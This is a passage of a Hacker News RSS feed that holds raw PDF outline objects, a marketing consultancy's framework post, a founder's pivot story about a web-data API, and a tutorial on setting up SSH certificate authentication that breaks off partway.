1083 0 obj
&lt;&lt; 
/Next 1084 0 R 
/Prev 1082 0 R 
/Parent 1024 0 R 
/Dest [ 277 0 R /Fit ] 
/Title (3-25)
&gt;&gt; 
endobj
1084 0 obj
&lt;&lt; 
/Next 1085 0 R 
/Prev 1083 0 R 
/Parent 1024 0 R 
/Dest [ 282 0 R /Fit ] 
/Title (3-26)
&gt;&gt; 
endobj
1085 0 obj
&lt;&lt; 
/Next 1086 0 R 
/Prev 1084 0 R 
/Parent 1024 0 R 
/Dest [ 287 0 R /Fit ] 
/Title (3-27)
&gt;&gt; 
endobj
1086 0 obj
&lt;&lt; 
/Next 1087 0 R 
/Prev 1085 0 R 
/Parent 1024 0 R 
/Dest [ 292 0 R /Fit ] 
/Title (3-28)
&gt;&gt; 
endobj
1087 0 obj
&lt;&lt; 
/Next 1088 0 R 
/Prev 1086 0 R 
/Parent 1024 0 R 
/Dest [ 297 0 R /Fit ] 
/Title (3-29)
&gt;&gt; 
endobj
1088 0 obj
&lt;&lt; 
/Next 1089 0 R 
/Prev 1087 0 R 
/Parent 1024 0 R 
/Dest [ 302 0 R /Fit ] 
/Title (3-30)
&gt;&gt; 
endobj
1089 0 obj
&lt;&lt; 
/Next 1090 0 R 
/Prev 1088 0 R 
/Parent 1024 0 R 
/Dest [ 307 0 R /Fit ] 
/Title (3-31)
&gt;&gt; 
endobj
1090 0 obj
&lt;&lt; 
/Next 1091 0 R 
/Prev 1089 0 R 
/Parent 1024 0 R 
/Dest [ 312 0 R /Fit ] 
/Title (3-32)
&gt;&gt; 
endobj
1091 0 obj
&lt;&lt; 
/Next 1092 0 R 
/Prev 1090 0 R 
/Parent 1024 0 R 
/Dest [ 317 0 R /Fit ] 
/Title (3-33)
&gt;&gt; 
endobj
1092 0 obj
&lt;&lt; 
/Next 1093 0 R 
/Prev 1091 0 R 
/Parent 1024 0 R 
/Dest [ 322 0 R /Fit ] 
/Title (3-34)
&gt;&gt; 
endobj
1093 0 obj
&lt;&lt; 
/Next 1094 0 R 
/Prev 1092 0 R 
/Parent 1024 0 R 
/Dest [ 327 0 R /Fit ] 
/Title (3-35)
&gt;&gt; 
endobj
1094 0 obj
&lt;&lt; 
/Next 1095 0 R 
/Prev 1093 0 R 
/Parent 1024 0 R 
/Dest [ 332 0 R /Fit ] 
/Title (3-36)
&gt;&gt; 
endobj
1095 0 obj
&lt;&lt; 
/Next 1096 0 R 
/Prev 1094 0 R 
/Parent 1024 0 R 
/Dest [ 337 0 R /Fit ] 
/Title (3-37)
&gt;&gt; 
endobj
1096 0 obj
&lt;&lt; 
/Next 1097 0 R 
/Prev 1095 0 R 
/Parent 1024 0 R 
/Dest [ 342 0 R /Fit ] 
/Title (3-38)
&gt;&gt; 
endobj
1097 0 obj
&lt;&lt; 
/Next 1098 0 R 
/Prev 1096 0 R 
/Parent 1024 0 R 
/Dest [ 347 0 R /Fit ] 
/Title (4-01)
&gt;&gt; 
endobj
1098 0 obj
&lt;&lt; 
/Next 1099 0 R 
/Prev 1097 0 R 
/Parent 1024 0 R 
/Dest [ 352 0 R /Fit ] 
/Title (4-02)
&gt;&gt; 
endobj
1099 0 obj
&lt;&lt; 
/Next 1100 0 R 
/Prev 1098 0 R 
/Parent 1024 0 R 
/Dest [ 357 0 R /Fit ] 
/Title (4-03)
&gt;&gt; 
endobj
1100 0 obj
&lt;&lt; 
/Next 1101 0 R 
/Prev 1099 0 R 
/Parent 1024 0 R 
/Dest [ 362 0 R /Fit ] 
/Title (4-04)
&gt;&gt; 
endobj
1101 0 obj
&lt;&lt; 
/Next 1102 0 R 
/Prev 1100 0 R 
/Parent 1024 0 R 
/Dest [ 367 0 R /Fit ] 
/Title (4-05)
&gt;&gt; 
endobj
1102 0 obj
&lt;&lt; 
/Next 1103 0 R 
/Prev 1101 0 R 
/Parent 1024 0 R 
/Dest [ 372 0 R /Fit ] 
/Title (4-06)
&gt;&gt; 
endobj
1103 0 obj
&lt;&lt; 
/Next 1104 0 R 
/Prev 1102 0 R 
/Parent 1024 0 R 
/Dest [ 377 0 R /Fit ] 
/Title (4-07)
&gt;&gt; 
endobj
1104 0 obj
&lt;&lt; 
/Next 1105 0 R 
/Prev 1103 0 R 
/Parent 1024 0 R 
/Dest [ 382 0 R /Fit ] 
/Title (4-08)
&gt;&gt; 
endobj
1105 0 obj
&lt;&lt; 
/Next 1106 0 R 
/Prev 1104 0 R 
/Parent 1024 0 R 
/Dest [ 387 0 R /Fit ] 
/Title (4-09)
&gt;&gt; 
endobj
1106 0 obj
&lt;&lt; 
/Next 1107 0 R 
/Prev 1105 0 R 
/Parent 1024 0 R 
/Dest [ 392 0 R /Fit ] 
/Title (4-10)
&gt;&gt; 
endobj
1107 0 obj
&lt;&lt; 
/Next 1108 0 R 
/Prev 1106 0 R 
/Parent 1024 0 R 
/Dest [ 397 0 R /Fit ] 
/Title (4-11)
&gt;&gt; 
endobj
1108 0 obj
&lt;&lt; 
/Next 1109 0 R 
/Prev 1107 0 R 
/Parent 1024 ‚Ä¶</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://walden-family.com/impcode/BBN1822_Jan1976.pdf">https://walden-family.com/impcode/BBN1822_Jan1976.pdf</a></em></p>]]>
            </description>
            <link>https://walden-family.com/impcode/BBN1822_Jan1976.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949100</guid>
            <pubDate>Sat, 31 Oct 2020 04:20:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Last Marketing Framework You'll Ever Need]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948930">thread link</a>) | @mooreds
<br/>
October 30, 2020 | https://www.reifyworks.com/writing/2020-10-14-introducing-the-vsf | <a href="https://web.archive.org/web/*/https://www.reifyworks.com/writing/2020-10-14-introducing-the-vsf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">

      


      <main id="main">
        
        <div>

          <div>
            <div>
              <div>
                

                <div>
                  <p>When we started Reify, the idea was pretty simple ‚Äì let‚Äôs take the experience we‚Äôve gained as marketers at developer facing companies, and apply that knowledge to as many software companies as we can. Let‚Äôs raise the tide for everyone, and help everyone become better marketers. After more than 4 years and 75 clients, we‚Äôre extremely happy with the results, and it felt like the right time to take a step back, consider what we‚Äôve accomplished and learned (and, glaringly, what mistakes we made), and try to do what every great marketer and consultant loves to do: define a framework.</p>

<p>Our first few clients, bless their souls, were very patient with us as we slowly but surely codified our methods. What started as a somewhat amorphous (but very enthusiastic, and usually quite successful somehow) ‚Äúprocess‚Äù turned into a repeatable set of working sessions, asynchronous assignments for our clients, and research and synthesis on our parts. We figured out just the right way to start with the stakeholders, document their story, do the hard work, and then end up with a <em>messaging framework that succinctly and successfully communicated the value of the product</em>.</p>

<p>Once we settled on the basic outline of the process, we did it again. And again. And again. We‚Äôve done this essential, foundational marketing engagement with more than 75 companies, from solo bootstrapped founders to public companies, and everything in-between. We expanded our initial notion of working with developer facing companies to working with a wide range of companies from <a href="https://testdouble.com/">award-winning software consultancies</a> to <a href="https://getchannels.com/">TV tech plays</a>, and even <a href="https://omg.network/">blockchain tech</a> (a category that barely existed when we started the company). We partnered with <a href="https://www.brightscout.com/">fabulous designers</a>, <a href="https://devrelate.io/">top content producers and community builders</a>, <a href="https://www.heavybit.com/">VC firms and event producers</a>, and we even started a <a href="https://epicconf.com/">little online conference with our friends.</a></p>

<p>Throughout all of this work, one thing remained very clear:</p>

<blockquote>
  <p>Nothing is more important than the story.</p>
</blockquote>

<p>And so it was a few months back when Brian and I tried to finally put a name to this process we‚Äôve developed that we settled on a name: The Value Story Framework (VSF). This post will focus on what the VSF is, and it will be followed by another post outlining how the VSF can be put to use in nearly any company to start with solid foundations, set reasonable goals, and execute marketing like a pro.</p>

<center><img src="https://www.reifyworks.com/images/vsf1.png"></center>



<h2 id="the-value-story-framework">The Value Story Framework</h2>

<p>The VSF has three concrete outputs:</p>

<ul>
  <li>The <em>value story</em>, which sums up the <em>Why</em> of the product</li>
  <li>The <em>refined persona</em>, which describes the <em>Who</em>, based on the essentials uncovered in the value story</li>
  <li>The <em>messaging framework</em>, which contains the words used to describe <em>What</em>, <em>Why</em>, and <em>How</em> to the refined persona</li>
</ul>

<p>One of the keys to the VSF is that <em>these outputs are entirely driven by inputs from the company‚Äôs key stakeholders</em>. We often tell our clients that they will have all of the good ideas during this process, and our job is to massage words, curate ideas, and present a complete, consistent package of ideas ‚Äì something that can be difficult to do if you‚Äôve never done it before.</p>

<p>The value story‚Äôs inputs come in the form of answering a series of questions about the origins of the company, focused initially on understanding <em>why</em> the people responsible for forming it came together. Beyond that, a timeline is established, and we also ask questions about other key factors: we get to know the competitive landscape a bit, we discuss important customers, and we discuss companies our clients admire and learn why.</p>

<p>Once we‚Äôve established your <em>value story</em>, we move on to the <em>refined persona</em>. This persona document, which we‚Äôve written about a few times over the years, is designed to allow you to focus in on what really matters when deciding what kind of marketing to do, when to do it, and what kind of content you need to produce. We ask stakeholders to list the key challenges of skills of the target persona, to consider what other tools they use and love, to tell us everything they know about what key roles and responsibilities that individual has at work. Once we‚Äôve honed in on the <em>one initial persona</em> we‚Äôre going to use, we give it a memorable nickname and then move on to the part that most people actually think about when they think about marketing: messaging and positioning.</p>

<p>Our <em>messaging framework</em> itself is nothing unique ‚Äì in fact we cribbed the structure of it by combining two different frameworks we found on the internet back when we were both marketing practitioners 5+ years ago. What does differentiate our process, however, is the process itself. While marketing is often done by thinking of cool sounding phrases and interesting angles first, and then matching the product‚Äôs marketing to it, we take the opposite approach.</p>

<blockquote>
  <p>Use your story, focus on your persona, deliver your message</p>
</blockquote>

<p>We ask our clients to, <em>while considering the persona very closely</em>, produce lists of examples that support the basic argument that your product is a great fit for this persona. The messaging framework is assembled by combining existing facts about the product, aimed directly at the persona, in a way that leads us and the clients naturally to the great sounding slogans that companies often come to us in search of.</p>

<h2 id="prove-it">Prove it!</h2>

<p>We‚Äôve been around a while, and worked with a decent number of clients you may have heard of, but the proof is in the pudding, right? How do you know that this stuff works at all? Beyond the fact that clients of ours who have used our frameworks directly have gone on to raise hundreds of millions of dollars in venture capital, added at least that much in revenue, come to dominate their own market niches, etc., nothing communicates out impact as effectively as their own words. To that end, here are some of our favorite client quotes:</p>

<blockquote>
  <p>‚ÄúReify‚Äôs marketing framework helped us discover and communicate the value of FireHydrant in a way that has really resonated with our core audience.‚Äù ‚Äì Robert Ross, CEO, FireHydrant</p>
</blockquote>

<blockquote>
  <p>‚ÄúDetermined AI is a technically complicated product, and communicating our value proposition early on was always a challenge. Reify‚Äôs frameworks helped us calibrate, and we went to market with messaging that helped us communicate clearly and effectively.‚Äù ‚Äì <em>Evan Sparks, Founder and CEO, Determined AI</em></p>
</blockquote>

<blockquote>
  <p>‚ÄúReify helped us develop a messaging framework that not only enabled us to level up how we communicate with our customers, but was also instrumental in telling the story that resulted in our recent Series A financing. We have a confidence and focus now that we didn‚Äôt before.‚Äù - <em>Caleb Hailey, CEO, Sensu</em></p>
</blockquote>

<p>And just because we love them so much, here are some of the great brand promises we‚Äôve helped our clients come up with, in the context of any software company‚Äôs core marketing asset, the website homepage:</p>

<center><img src="https://www.reifyworks.com/images/hero_sanity.png"></center>

<center><img src="https://www.reifyworks.com/images/hero_td.png"></center>

<center><img src="https://www.reifyworks.com/images/hero_stackbit.png"></center>

<p>And there are tons more.</p>

<h2 id="so--how-do-i-use-it">So ‚Ä¶ How Do I Use It?</h2>

<p>We‚Äôre working on a few different ways to share the VSF with the world. The first step will be a followup to this post, which will contextualize the Value Story, Refined Persona, and Messaging Framework in day to day marketing operations. After that, we‚Äôre planning on opening up a software platform version of our framework that will allow <em>anyone to leverage these tools</em> to become the awesome marketers we know they‚Äôre capable of. Yes, after all this time teaching people how to fish, we‚Äôre going to be fishing ourselves a bit ‚Äì and making a small software product to sell to early marketing teams. Sound cool? <strong><a href="https://calendly.com/briandoll/reify-chat">Book a 30-min Session with Reify Right Now</a></strong> to learn more!</p>


                  <hr>
                  <br>
                  
<br>


                </div>

              </div>
            </div>
          </div>
        </div>

      </main>

      
    </div></div>]]>
            </description>
            <link>https://www.reifyworks.com/writing/2020-10-14-introducing-the-vsf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948930</guid>
            <pubDate>Sat, 31 Oct 2020 03:26:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: TypeScript Hack ‚Äì Type System Text Adventure]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24948911">thread link</a>) | @ricksharp
<br/>
October 30, 2020 | https://ricklove.me/typescript-type-system-adventure | <a href="https://web.archive.org/web/*/https://ricklove.me/typescript-type-system-adventure">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://ricklove.me/typescript-type-system-adventure</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948911</guid>
            <pubDate>Sat, 31 Oct 2020 03:22:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Better Mousetrap ‚Äì Converting WebPages to Web APIs]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 13 (<a href="https://news.ycombinator.com/item?id=24948779">thread link</a>) | @shanselman
<br/>
October 30, 2020 | https://turnerj.com/blog/a-better-mousetrap | <a href="https://web.archive.org/web/*/https://turnerj.com/blog/a-better-mousetrap">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="article">
<p>Today is a big day for me as after many months (or years depending how you look at it), I've <a href="https://www.producthunt.com/posts/brandvantage">finally launched the first product for my business, BrandVantage</a>.
This post is the story of how I started with one idea and ended up launching with a different one.</p>
<h2>The Original Idea: Let's build a digital brand expert!</h2>
<p>I worked as a web developer for a local web development agency for a number of years and in that time, I learnt a lot about how a variety of different businesses operated online.</p>
<p>There were a few key "problems" I found in common across many of those businesses:</p>
<ul>
<li>Under-utilising analytics</li>
<li>Misunderstanding analytics</li>
<li>Not keeping on top of industry information</li>
<li>Lack of competitor analysis/understanding</li>
<li>Difficulty with Search Engine Optimization (SEO)</li>
</ul>
<p>In moderate-to-large companies where you have marketing departments, most of this stuff can be covered by one or more staff dedicated to these things.
In smaller companies, the business owner is normally the one where these tasks fall on to, but they are already wearing many different hats.
It felt like something was here - if I could automate some of these tasks in different ways, I could both help business owners and earn myself some money along the way.</p>
<p>Automation of tasks, especially ones in analytics or SEO spaces, isn't a new idea.
In fact, I've seen many businesses in a similar space launch on Product Hunt over the years since starting, but that didn't deter me.
I was building <a href="https://idioms.thefreedictionary.com/a+better+mousetrap"><em>a better mousetrap</em></a> and wanting to launch it at a lower price, not something truly innovative so it was going to be an uphill battle.
This area though, helping small businesses online be as efficient in tasks as some bigger businesses can, is something I felt passionately about so I proceeded anyway.</p>
<h3>Attempt One: Very Hacky (in PHP)</h3>
<p>Way back in 2015/16/17, while still at my full-time job, I spent nights and weekends building and tinkering on solutions to the problems business owners face.
It was a hacky PHP solution pulling real-time information from sources like Twitter, Google Analytics and Facebook.
A hacky approach seemed like a good idea as that seemed to be the way people launched things, do the quickest and hackiest thing you can to get it out the door.</p>
<p>While working on it, I had a few interested parties though what I built could barely be considered a prototype.
The thing was a mess.
I could do some basic queries, but it wasn't what I considered sellable and definitely not user-friendly, something I considered key to the product.
I was also running into technical problems with scale - any sufficiently complex query was performed real-time, which was getting more complicated.
Real-time processing had to be out.
I needed to pre-compute and store it in a database.</p>
<p>I wanted to take this more seriously and I didn't feel like a "quick and hacky" approach to building a product was right for me.
With this in mind, it seemed like a good opportunity to change the tech stack to something that would be better long term.</p>
<h3>Attempt Two: Slightly Less Hacky (in .NET)</h3>
<p>Moving to .NET felt like the smart move for me as at my job I had spent a lot more time working in .NET than PHP, plus I vastly prefered the tooling in .NET vs PHP.
That said, the .NET code I had worked on to-date would definitely be considered "legacy code".</p>
<p>My first version in .NET (specifically .NET Framework), predating my use of version control, was trying to keep costs low by using MySQL through Entity Framework.
After a lot of pain and suffering with that, I had a short stint of MSSQL before I settled upon MongoDB.</p>
<p>MongoDB might seem like a weird choice - there are some people that have very strong opinions about which type of database you should use.
Honestly it came down to a gut feel after messing around with it - it seemed more compatible to the way I was approaching problems than a relational database would.
I liked the code-first approach to Entity Framework so much though that I recreated the "feel" of Entity Framework for MongoDB with some custom code.
This later became an open source project of mine called <a href="https://www.mongoframework.com/">MongoFramework</a>.</p>
<p>I'm not going to lie, progress was... slow.
While I was putting quite a lot of time into working on it, it was still an extremely ambitious project.
I have strong feelings about building "MVPs" where some people focus too much on the "minimum" without enough focus on the "viable".
At the end of the day people buy products that meet their needs, and cutting too much out would meet no-ones needs.
If someone was going to use this, in a market with many competitors of varying quality, it had to do its job well.
There didn't seem much I could reasonably cut to make it any more minimal if I wanted people to buy it.</p>
<p>I kept working at it every night, building pieces to extract and store data from a variety of sources.
I was pulling in data from Google Analytics, Google Webmaster Tools (now called Google Search Console), Twitter, Facebook, IP Geolocation, DNS information and also from news articles.
What I thought I could do is once I had the different data sources together, I would write custom rules that could infer insights from individual or combined data sets.
These insights would form the basis of the "digital brand expert".
After all, that was the goal of the idea, something that could help out small business owners.</p>
<p>After 2 years of working on this in my spare time, it felt the right time to leave my job and go into this full time.
I felt like I was <em>so close</em> to launching and I just needed something more than the same day-to-day work.
So I did it - <a href="https://turnerj.com/blog/i-left-my-job-today-after-seven-years">I left my job after 7 years</a>.</p>
<h3>Going Full-time into the Idea</h3>
<p>Right out of the gate, I had moved from .NET Framework to .NET Core, was working on UI/UX improvements for the application and launched the website for it.
I worked with an accountant and a lawyer to setup the business, bought a trade mark for the product name, and I felt good like I was only a few months away from launching.
This feeling didn't last though...</p>
<p>Over time, it felt like I was taking two steps forward then one step back - some technical, some business related.
Sure, that is still progress, but having new issues crop up every day or so can really crush your motivation.</p>
<p>My best/happiest/most productive days were days I ignored or avoided different issues I had.
If I had a problem with the login system, I would focus on how the UX of the menus worked.
If I had a problem with data gathering, I would add more tests to the codebase.
While I didn't entirely ignore the problem, I would wait a week or two before I looked at it again, somewhat hoping it would solve itself - unfortunately that isn't how things work.</p>
<p>In time though, I got to a stage where it felt like I could launch and was hyping myself up until reality struck: I didn't actually build what I set out to build.</p>
<p>The UI/UX was good, I had strategies for deployment and plans for next steps, but it wasn't a "digital brand expert".
It was instead a glorified data store for information that people could better access through existing tools.
That's kinda a big problem!</p>
<p><img src="https://turnerj.com/blog/2020/images/a-better-mousetrap-ive-made-a-huge-mistake.gif" alt="Gob Bluth saying &quot;I've made a huge mistake.&quot; from the TV Show &quot;Arrested Development&quot;"></p>
<p>When realising this I poured time into fixing that huge lapse in judgement, but I couldn't do it.
No matter how I tried, I just couldn't figure out how to build this rules engine.
It was like my entire thought process was just clouded.
I couldn't see the solution to the problem like I can for most other things.</p>
<p>This was depressing and I ended up having a month or so hiatus from working on it.
When I have had stints of not feeling like or not being able to do programming in the past, I try and spur it on again by watching some show or movie which has some strong relation to technology (fictional or not).
My go-to is usually something like <a href="https://www.imdb.com/title/tt0371746/">Iron Man</a>, but this time I was rewatching <a href="https://www.imdb.com/title/tt2543312/">Halt and Catch Fire</a> where I found some inspiration.</p>
<h2>The Pivot: An API to the Internet</h2>
<p>Later in the series a lot of the focus is around the Web, and it was in these episodes where my thoughts about the Internet and the data on it have changed.
There is a quote from one of the main characters at the end of Season 3 that resonates with me:</p>
<div>
<blockquote>
<p>"The moment we decide what the Web is, we've lost. The moment we try to tell people what to do with it, we've lost.
All we have to do is build a door and let them inside."</p>
<p>- Joe MacMillan (Season 3, Episode 10)</p>
</blockquote>
</div>
<p>The Internet is a treasure trove of information, it is searchable but generally unstructured.
People have managed to create all sorts of different pages in HTML, but in the process of making a website everything is designed for a human user.
It is this way for obvious reasons, <em>we</em> are the consumers of web pages after all... aren't we?</p>
<p>Behind these user-friendly web pages are usually other specific bits of markup, providing some level of structured data for specific situations.
Sometimes it is a description metatag for search engines, other times it might be <a href="https://ogp.me/">Open Graph</a> metatags for social media links.
We build these things to help aid computers processing our web pages.</p>
<p>In 2011, <a href="https://schema.org/">Schema.org</a> was created.
This was a collaborative effort between Google, Bing and Yahoo (later that year, Yandex as well) with the mission to "create, maintain, and promote schemas for structured data on the Internet, on web pages, in email messages, and beyond".
Through 3 different encodings (<a href="https://turnerj.com/blog/what-is-microdata-and-why-should-i-care">Microdata</a>, <a href="http://rdfa.info/">RDFa</a> and <a href="https://json-ld.org/">JSON-LD</a>), websites could express detailed structured data.</p>
<p>There is another quote from Halt and Catch Fire which I like:</p>
<div>
<blockquote>
<p>"Computers aren't the thing. They're the thing that gets us to the thing."</p>
<p>- Joe MacMillan (Season 1, Episode 1)</p>
</blockquote>
</div>
<p>As much as I like computers and programming, they are used to help us achieve other goals.
From my attempts of trying to build a "digital brand expert", I knew that data is fundamental to help build more advanced systems and give new insights.
Having easier access to other forms of data from web pages around the world may allow new and different tools to be built.</p>
<p>So I decided rather than try and solve a problem that I was clouded by, I ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://turnerj.com/blog/a-better-mousetrap">https://turnerj.com/blog/a-better-mousetrap</a></em></p>]]>
            </description>
            <link>https://turnerj.com/blog/a-better-mousetrap</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948779</guid>
            <pubDate>Sat, 31 Oct 2020 02:49:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Onion for Crypto]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948746">thread link</a>) | @npguy
<br/>
October 30, 2020 | http://doublespend.io/index.php | <a href="https://web.archive.org/web/*/http://doublespend.io/index.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://doublespend.io/index.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948746</guid>
            <pubDate>Sat, 31 Oct 2020 02:43:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why every SSH user should switch to using SSH Certificates]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24948738">thread link</a>) | @dbsentry
<br/>
October 30, 2020 | https://keyper.dbsentry.com/post/sshca/ | <a href="https://web.archive.org/web/*/https://keyper.dbsentry.com/post/sshca/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The last few years have seen rapid automation of many Systems Administration/DevOps tasks. The new mantra is if you need to ssh to a server, your automation is not working right. But even for the occasional ssh access to the servers, the SSH authentication must be managed. Over the years, SSH has added many new features/techniques to enhance authentication and put some governance around it. This article is about the use of SSH Certificate-based authentication and why every organization, using SSH, must use it.</p><p>SSH Key-based authentication (aka passwordless login) has been with us for over two decades now. The mechanism works based on public-key cryptography. One adds his/her RSA/DSA key to the authorized_keys file on the server. The user with the corresponding private key can login without a password. It works great except for a few fundamental problems:</p><ol><li>When a user accesses the server using ssh for the first time, s/he always gets Trust On First Use (TOFU) warning.</li></ol><pre><code>$ ssh -l alice mavrix5.dbsentry.com
The authenticity of host 'mavrix5.dbsentry.com (72.191.40.116)' can't be established.
ECDSA key fingerprint is SHA256:PoK81UWgOBMn6owOoHXjGoBLWqcJ4E9JCiLQyiFF60s.
Are you sure you want to continue connecting (yes/no)? 
</code></pre><p>As the server is not trusted at this point, theoretically a man-in-the-middle attack could be launched. I tried to find damaging incidents of such attacks on the internet but could not find any. Nevertheless, the possibility exists and we‚Äôd be better off getting rid of this warning.</p><ol start="2"><li>When the number of servers increases, authorized_keys files proliferate and they are hard to manage. Moreover, once added they are active perpetually and have to be removed manually to block access to its corresponding private key. That is probably the reason why many security guys frown on the use of authorized_keys.</li></ol><p>Fortunately, the newer version of SSH included many improvements that give us the ability to centralize and better manage authorized_keys using <code>AuthorizedKeysCommand</code>. However, the TOFU remains. Although the solutions exist in either the use of SSHFP or SSH Certificates, their usage never caught on.</p><p>Having said that, in addition to taking care of TOFU, SSH Certificates have many more advantages/features (for e.g. certificate expiration, use of principals, etc) that enhance SSH authentication governance and should be used by all organizations that use SSH.</p><p>Instead of using complex X.509 style certificates, SSH chose to use their own simpler format of certificates, which can be easily managed using CLI <code>ssh-keygen</code>. In order to use SSH certificate-based authentication one needs to set up SSH Certificate Authority (CA). So, how does one set up SSH CA?</p><p>SSH Certificate authority can be setup on any computer with <code>ssh-keygen</code>. It is a key pair that is used to sign SSH Public Keys to generate certificates. It is recommended to set up two pairs of CA keys: one for host certificates and others for user‚Äôs certificates.</p><p>Use <code>ssh-keygen</code> to genearet CA Keys:</p><pre><code>$ ssh-keygen -t rsa -f ca_host_key
$ ssh-keygen -t rsa -f ca_user_key
</code></pre><p>The above would generate two pairs of SSH Keys. for e.g.</p><pre><code>$ ssh-keygen -t rsa -f ca_host_key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ca_host_key.
Your public key has been saved in ca_host_key.pub.
The key fingerprint is:
SHA256:Epoq1Vy0/orivKOwxepBLqD7mGuaWbUKh+SoycMpKy0 manish@picanmix4
The key's randomart image is:
+---[RSA 2048]----+
|      .          |
|     . .         |
|      +          |
|   o = .         |
|.o. * o S        |
|O+ o . o         |
|X=B .   .        |
|E^=. . .         |
|^XB+. .          |
+----[SHA256]-----+
$ ssh-keygen -t rsa -f ca_user_key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ca_user_key.
Your public key has been saved in ca_user_key.pub.
The key fingerprint is:
SHA256:9cW4eNS9mNUWWeSRDG9ONjMAWfOTpx9kuLfZyHEMAME manish@picanmix4
The key's randomart image is:
+---[RSA 2048]----+
|         .o+==o+*|
|          E. =**=|
|          . o.=/*|
|         . + o%=B|
|        S . ++o=o|
|           . ..==|
|              ooo|
|                 |
|                 |
+----[SHA256]-----+
$ ls -l
total 32
-rw-------  1 alice  staff  1823 Oct 30 13:19 ca_host_key
-rw-r--r--  1 alice  staff   398 Oct 30 13:19 ca_host_key.pub
-rw-------  1 alice  staff  1823 Oct 30 13:19 ca_user_key
-rw-r--r--  1 alice  staff   398 Oct 30 13:19 ca_user_key.pub
</code></pre><p>Optional: In addition you can also setup SSH Key Revocation List (KRL). This is a list of all revoked certificates.</p><pre><code>$ ssh-keygen -k -f ca_krl
</code></pre><p>And, thats it. your SSH CA is in business. Now, going forward, you just need to configure your servers and clients to use certificates with private keys.</p><h2 id="ssh-server-configuration">SSH Server Configuration</h2><p>Follow these steps to configure host to use SSH certificates:</p><ol><li>Copy your servers SSH Public Key, typically located under <code>/etc/ssh/ssh_host_rsa_key.pub</code> or <code>/etc/ssh/ssh_host_dsa_key.pub</code> and get it signed.</li></ol><pre><code>$ ssh-keygen -h -s ca_host_key -z &lt;serial no.&gt; -I &lt;hostname&gt; -V &lt;duration&gt; -n &lt;principal list&gt; ssh_host_rsa_key.pub
</code></pre><p>for e.g</p><pre><code>$ ssh-keygen -vvv -h -s ca_host_key -z 100 -I mavrix2 -V +52w -n mavrix2,mavrix2.dbsentry.com ssh_host_ed25519_key.pub
Signed host key ssh_host_ed25519_key-cert.pub: id "mavrix2" serial 100 for mavrix2,mavrix2.dbsentry.com valid from 2020-10-30T14:46:00 to 2021-10-29T14:47:02
</code></pre><ol start="2"><li>Copy the certifcate back to the host under <code>/etc/ssh</code></li><li>Copy CA User Public Key(<code>ca_user_key.pub</code>) to the host under <code>/etc/ssh</code></li><li>Add the following to <code>sshd_conf</code> file:</li></ol><pre><code>TrustedUserCAKeys /etc/ssh/ca_user_key.pub
HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub
</code></pre><p><code>TrustedUserCAKeys</code> directs SSH to trust certificates signed by <code>ca_user_key</code>. And, <code>HostCertificate</code> directs SSH to send the host certificate instead of public key to the client.
5. Restart SSH</p><pre><code>$ sudo systemctl restart sshd
</code></pre><h2 id="ssh-client-configuration">SSH Client Configuration</h2><p>Follow the following steps to configure client/user to use SSH certificates:</p><ol><li>Copy user‚Äôs SSH Public Key (typically located under <code>&lt;usershome&gt;/.ssh/id_rsa.pub</code>. If not present, it can be generated using <code>ssh-keygen -t rsa</code>) to the CA host and get it signed</li></ol><pre><code>$ ssh-keygen -s ca_user_key -z &lt;serial no&gt; -I &lt;username&gt; -V &lt;duration&gt; -n &lt;principal list&gt; id_rsa.pub
</code></pre><p>for e.g</p><pre><code>$ ssh-keygen -s ca_user_key -z 100 -I alice -V +2h -n alice,apache id_rsa.pub
Signed user key id_rsa-cert.pub: id "alice" serial 100 for alice,apache valid from 2020-10-30T14:56:00 to 2020-10-30T16:57:51
</code></pre><p>You can look at the content of the certificate using the following command:</p><pre><code>$ ssh-keygen -L -f id_rsa-cert.pub 
id_rsa-cert.pub:
      Type: ssh-rsa-cert-v01@openssh.com user certificate
      Public key: RSA-CERT SHA256:2J9G7t6Dn11nKlI5l9USbHAFRTuBUUVxqbL+uHQaaDc
      Signing CA: RSA SHA256:X75sKpv1L2B6y/mIUYKZc0QVmQD8CgpcBS+ZhRPbRmk (using ssh-rsa)
      Key ID: "alice"
      Serial: 100
      Valid: from 2020-10-30T14:56:00 to 2020-10-30T16:57:51
      Principals: 
              alice
              apache
      Critical Options: (none)
      Extensions: 
              permit-X11-forwarding
              permit-agent-forwarding
              permit-port-forwarding
              permit-pty
              permit-user-rc
